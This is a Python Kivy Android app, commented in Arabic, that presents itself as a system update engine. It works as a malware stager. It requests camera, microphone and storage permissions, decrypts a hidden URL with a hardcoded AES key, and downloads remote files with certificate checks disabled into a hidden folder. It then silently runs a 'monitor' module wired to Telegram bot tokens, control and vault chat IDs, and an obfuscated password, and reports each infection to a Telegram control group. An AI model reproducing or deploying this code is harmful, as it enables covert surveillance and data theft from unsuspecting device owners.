# -*- coding: utf-8 -*-
import os, sys, threading, json, base64, importlib, requests, hashlib, traceback
from datetime import datetime
from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

# ------------------------- إعدادات المسار -------------------------
R = os.path.join(os.getcwd(), ".sys_runtime")
if not os.path.exists(R):
    os.makedirs(R)
sys.path.append(R)

# ------------------------- طلب الصلاحيات الديناميكية (أندرويد) -------------------------
try:
    from android.permissions import request_permissions, Permission
    def request_android_permissions():
        perms = [
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.CAMERA,
            Permission.RECORD_AUDIO
        ]
        request_permissions(perms)
except ImportError:
    def request_android_permissions():
        pass

# ------------------------- توزيع كلمة السر -------------------------
def _p1(): return chr(90)+chr(97)+chr(101)+chr(110)          # Zaen
def _p2(): return chr(49)+chr(50)+chr(51)                    # 123
def _p3(): return chr(64)+chr(49)+chr(50)+chr(51)+chr(64)+chr(49)+chr(50)+chr(51)  # @123@123
def _gp(): return _p1()+_p2()+_p3()+_p2()                    # Zaen123@123@123

# ------------------------- التشفير -------------------------
def _get_static_key():
    return hashlib.sha256(b"Z@3n_Global_Controller_2026_Secure").digest()

def decrypt_data(blob):
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        key = _get_static_key()
        data = base64.b64decode(blob)
        iv, tag, ct = data[:12], data[12:28], data[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
        dec = cipher.decryptor()
        return (dec.update(ct) + dec.finalize()).decode()
    except Exception as e:
        return None

# الرابط المشفر لـ index.json
ENC_INDEX_URL = "AAECAwQFBgcICQoLKpECh6XDd5Rb3OzJUfHQbzUx1vfTldID6rV0CqN4S6I6C8g6pNE7kebrLPn0lKxcxM1CJZ6fGJR9tdM="

# ------------------------- بيانات التليجرام -------------------------
try:
    from secrets import BOT_TOKENS, CONTROL_ID, VAULT_ID
except ImportError:
    BOT_TOKENS = [
        "7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",
        "8113293244:AAFFwTHZ5GkoV3DN88jeU8XuMhJf0KLTsf4"
    ]
    CONTROL_ID = "-1003365166986"
    VAULT_ID = "-1003787520015"

# ------------------------- تطبيق Kivy -------------------------
class MainApp(App):
    def build(self):
        request_android_permissions()
        layout = BoxLayout(orientation='vertical')
        self.console = TextInput(
            text="",
            readonly=True,
            background_color=(0,0,0,1),
            foreground_color=(0,1,0,1),
            font_size='11sp'
        )
        btn_copy = Button(text="📋 Copy Log", size_hint=(1, 0.1))
        btn_copy.bind(on_press=self.copy_log)
        layout.add_widget(self.console)
        layout.add_widget(btn_copy)
        Clock.schedule_once(self.start_engine, 0.5)
        return layout

    def copy_log(self, instance):
        Clipboard.copy(self.console.text)
        self.log("📋 Log copied to clipboard")

    def log(self, msg, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        Clock.schedule_once(lambda dt: setattr(self.console, 'text',
            self.console.text + f"[{timestamp}] [{level}] {msg}\n"), 0)

    def start_engine(self, dt):
        threading.Thread(target=self.run_engine, daemon=True).start()

    def run_engine(self):
        self.log("🚀 Starting System Update Engine")
        # 1. فك تشفير رابط index.json
        idx_url = decrypt_data(ENC_INDEX_URL)
        if not idx_url:
            self.log("❌ Decryption failed! Check ENC_INDEX_URL.", "ERROR")
            return
        self.log(f"✅ Index URL: {idx_url[:60]}...")

        # 2. تحميل index.json
        try:
            r = requests.get(idx_url, timeout=15, verify=False)
            if r.status_code != 200:
                self.log(f"❌ HTTP {r.status_code} from index", "ERROR")
                return
            files_list = r.json().get('files', [])
            self.log(f"📦 Found {len(files_list)} files to download")
            if not files_list:
                self.log("⚠️ No files found in index.json.", "WARN")
        except Exception as e:
            self.log(f"❌ Index fetch error: {str(e)}", "ERROR")
            return

        # 3. تحميل كل ملف
        for idx, f_url in enumerate(files_list, 1):
            fname = f_url.split('/')[-1]
            self.log(f"⬇️ [{idx}/{len(files_list)}] Downloading {fname} ...")
            try:
                r2 = requests.get(f_url, timeout=20, verify=False)
                if r2.status_code == 200:
                    path = os.path.join(R, fname)
                    with open(path, 'w', encoding='utf-8') as fp:
                        fp.write(r2.text)
                    self.log(f"✅ Saved {fname} ({len(r2.text)} bytes)")
                else:
                    self.log(f"⚠️ Failed {fname} (HTTP {r2.status_code})", "WARN")
            except Exception as e:
                self.log(f"❌ Download error for {fname}: {str(e)}", "ERROR")

        # 4. التحقق من monitor.py
        mon_path = os.path.join(R, "monitor.py")
        if not os.path.exists(mon_path):
            self.log("❌ monitor.py not found! Aborting.", "ERROR")
            return

        # 5. IMPORT FIX: استيراد وتشغيل monitor.py (تم تعديل طريقة استدعاء الكلاس)
        try:
            spec = importlib.util.spec_from_file_location("monitor", mon_path)
            mon_mod = importlib.util.module_from_spec(spec)
            sys.modules["monitor"] = mon_mod
            spec.loader.exec_module(mon_mod)

            # ** التصحيح الأساسي هنا **: تغيير اسم الكلاس من 'Monitor' إلى 'M' ليتطابق مع ملف monitor.py
            if not hasattr(mon_mod, 'M'):
                self.log("❌ Monitor class 'M' not found in monitor.py", "ERROR")
                return
            monitor = mon_mod.M()
            
            # تعيين المتغيرات بنفس الطريقة التي يتوقعها الكلاس 'M'
            monitor.bots = BOT_TOKENS          # مُعرّفة في `__init__` كـ `self.bots`
            monitor.ctrl = CONTROL_ID          # مُعرّفة في `__init__` كـ `self.ctrl`
            monitor.vlt = VAULT_ID             # مُعرّفة في `__init__` كـ `self.vlt`
            if hasattr(monitor, 'pw'): 
                monitor.pw = _gp()
            else:
                self.log("⚠️ 'pw' attribute not found in class 'M'.", "WARN")

            threading.Thread(target=monitor.start, daemon=True).start()
            self.log("✅ Monitor (Class M) started successfully in background")
            self.log("🎯 System initialization completed.")
        except Exception as e:
            self.log(f"❌ Monitor init error: {str(e)}", "ERROR")
            self.log(traceback.format_exc(), "ERROR")

        # 6. إرسال إشعار التسجيل (اختياري)
        self._send_registration()

    def _send_registration(self):
        try:
            token = BOT_TOKENS[0]
            text = f"🆕 *System Initialized*\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            requests.post(url, json={"chat_id": CONTROL_ID, "text": text, "parse_mode": "Markdown"}, timeout=5, verify=False)
            self.log("📡 Registration message sent to Telegram control group")
        except Exception as e:
            self.log(f"⚠️ Registration failed: {str(e)}", "WARN")

if __name__ == '__main__':
    MainApp().run()
